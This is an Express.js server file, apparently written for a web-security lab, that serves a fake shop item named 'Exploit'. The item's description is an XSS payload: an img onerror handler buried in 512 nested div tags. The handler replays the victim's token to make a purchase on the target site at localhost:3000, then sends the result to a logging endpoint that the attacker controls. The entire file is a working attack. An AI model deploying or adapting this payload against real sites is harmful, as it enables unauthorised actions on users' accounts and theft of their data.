const express = require('express');
const app = express();
const cors = require('cors');

app.use(cors());

const PORT = 4000;
const url = "http://localhost:3000";
const serverLogUrl = "http://localhost:4000";

app.use(express.json());

app.post('/log', (req, res) => {
    const data = req.body.data;
    console.log('서버로부터 받은 data:', data);
    res.send('서버 로그에 출력됨');
});

app.get('/info', (req, res) => {
    const token = req.headers['token'];

    const detailWithFetch = `${`<div>`.repeat(512)}<img src='' onerror='fetch("${url}/4/buy", {method: "POST",headers: {"Content-Type": "application/json","token": "${token}"}}).then(response => response.json()).then(data => { fetch("${serverLogUrl}/log", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({data: data.data})}) })'/>${`</div>`.repeat(512)}`;

    const items = {
        "id": 5,
        "name": "Exploit",
        "price": 9,
        "detail": detailWithFetch,
        "poster": ""
    };

    if (items) {
        res.send(items);
    } else {
        res.status(403).send('');
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
